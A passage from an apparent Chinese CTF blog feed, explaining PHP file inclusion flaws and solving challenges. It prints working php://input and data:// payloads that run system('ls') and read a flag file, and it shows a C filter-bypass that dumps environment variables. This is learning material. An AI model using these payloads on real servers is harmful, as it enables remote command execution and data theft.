variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 包含并执行 $page 对应的文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><blockquote>\n<p>由于这段代码对用户输入的  <code>$page</code>  参数直接进行了  <code>include</code> ，存在安全风险。未经验证的用户输入可能导致远程文件包含（RFI）攻击或代码注入漏洞。</p>\n</blockquote>\n<blockquote>\n<p>一、文件包含漏洞分类</p>\n<p>LFI(Local File Inclusion)<br>\n 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是 LFI。<br>\n为了方便本文把 LFI 直接称为文件包含漏洞。</p>\n<p>RFI(Remote File Inclusion)<br>\n 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI 的利用条件较为苛刻，需要 php.ini 中进行配置</p>\n<pre><code>allow_url_fopen = On\nallow_url_include = On\n</code></pre>\n<p>两个配置选项均需要为 On，才能远程包含文件成功。<br>\n在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</blockquote>\n<blockquote>\n<p>二、文件包含漏洞原理</p>\n<p>本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。</p>\n<p>服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。</p>\n<p>这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>\n<p>LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。<br>\n如若攻击者能够通过其他方式在 Web 服务器上放置代码，那么他们便可以执行任意命令</p>\n</blockquote>\n<blockquote>\n<p>三、文件包含函数</p>\n<p>PHP 中文件包含函数有以下四种：</p>\n<p>require () // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>\n<p>require_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include () // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>\n<p>include_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include 和 require 区别主要是，include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>\n而 require 函数出现错误的时候，会直接报错并退出程序的执行。</p>\n<p>而 include_once ()，require_once () 这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>\n<p>这四个函数可以将任意类型的文件当做 PHP 文件进行解析。<br>\n示例代码：</p>\n   <?php\n       $filename  = $_GET['filename']; // 存在可控变量\n       include($filename); // 存在动态变量\n   ?>\n<p>例如：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>参数开发者没有经过严格的过滤，直接带入了</mtext><mi>i</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>u</mi><mi>d</mi><mi>e</mi><mtext>的函数，攻击者可以修改</mtext></mrow><annotation encoding=\"application/x-tex\">_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，\n攻击者可以修改\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">开</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">严</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">滤</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">直</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">带</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">攻</span><span class=\"mord cjk_fallback\">击</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">改</span></span></span></span>_GET [‘filename’] 的值，执行非预期的操作。</p>\n</blockquote>\n<ul>\n<li>【file:// 协议】</li>\n</ul>\n<blockquote>\n<p>file:// 协议在双 off 的情况下也可以正常使用；</p>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p>file:// 用于访问本地文件系统，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p>\n<p>使用方法：</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<ul>\n<li>【php:// 协议】</li>\n</ul>\n<blockquote>\n<p>条件：</p>\n<p>不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p>\n<p>php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。</p>\n</blockquote>\n<ul>\n<li>【data:// 协议】</li>\n</ul>\n<blockquote>\n<p>经过测试官方文档上存在一处问题，经过测试 PHP 版本 5.2，5.3，5.5，7.0；data:// 协议是是受限于 allow_url_fopen 的，官方文档上给出的是 NO，所以要使用 data:// 协议需要满足双 on 条件</p>\n<p>例子：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=\">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>\n<p>or</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==\">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>\n</blockquote>\n<p><img data-src=\"/img/webpic/713e77b23fb645afa92fb923eda7ac77.png\" alt=\"img\"></p>\n<ol>\n<li>方法一：</li>\n</ol>\n<p>php 协议：</p>\n<p><img data-src=\"/img/webpic/image-20230824233946558.png\" alt=\"image-20230824233946558\"></p>\n<p>只能用 burp 不能用 harkbar 有点奇怪</p>\n<p>请求包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?page=PhP://input</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">61.147.171.105:64567</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">21</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;?php system(\"ls\");?></pre></td></tr></table></figure><p>有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824234142386.png\" alt=\"image-20230824234142386\"></p>\n<p>得到 flag</p>\n<ol start=\"2\">\n<li>方法二：</li>\n</ol>\n<p><img data-src=\"/img/webpic/image-20230824235157008.png\" alt=\"image-20230824235157008\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"ls\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //推荐</span></span></pre></td></tr></table></figure><p>都可以</p>\n<p><img data-src=\"/img/webpic/image-20230824235301184.png\" alt=\"image-20230824235301184\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"cat fl4gisisish3r3.php\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //推荐</span></span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/13/Nep-wp/",
            "url": "https://yhuanhuan01.github.io/2023/08/13/Nep-wp/",
            "title": "Nep__wp",
            "date_published": "2023-08-13T13:28:56.000Z",
            "content_html": "<h1 id=\"nepctf-wp\"><a class=\"markdownIt-Anchor\" href=\"#nepctf-wp\">#</a> NepCTF   wp</h1>\n<p>第一次大型比赛，得到这个成绩也不错了。</p>\n<p><img data-src=\"/img/wp/image-20230813204701517.png\" alt=\"image-20230813204701517\"></p>\n<blockquote>\n<p>{ = 空格</p>\n</blockquote>\n<h2 id=\"1-misc\"><a class=\"markdownIt-Anchor\" href=\"#1-misc\">#</a> 1. misc:</h2>\n<h4 id=\"1codes\"><a class=\"markdownIt-Anchor\" href=\"#1codes\">#</a> 1.codes:</h4>\n<pre><code>环境env要\nen\\\nv绕过下\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>en\\</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>viron<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>en\\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> en\\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/1.png\" alt=\"\"></p>\n<h4 id=\"2与ai共舞的哈夫曼\"><a class=\"markdownIt-Anchor\" href=\"#2与ai共舞的哈夫曼\">#</a> 2. 与 AI 共舞的哈夫曼</h4>\n<p><u>这就是 hint 嘛，年轻人就要年轻，正经人谁自己写代码</u></p>\n<p>AI 代码放进去，自己给 嘻嘻</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> heapq</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">HuffmanNode</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>char <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__lt__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>freq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_codes</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">,</span> current_code<span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> node <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>char <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        huffman_codes<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>char<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> current_code</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> byte <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    root <span class=\"token operator\">=</span> build_huffman_tree<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    compressed_data <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        compressed_data <span class=\"token operator\">+=</span> huffman_codes<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    compressed_data <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> padding</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\"># Write frequency information</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> freq <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># Write compressed data</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token 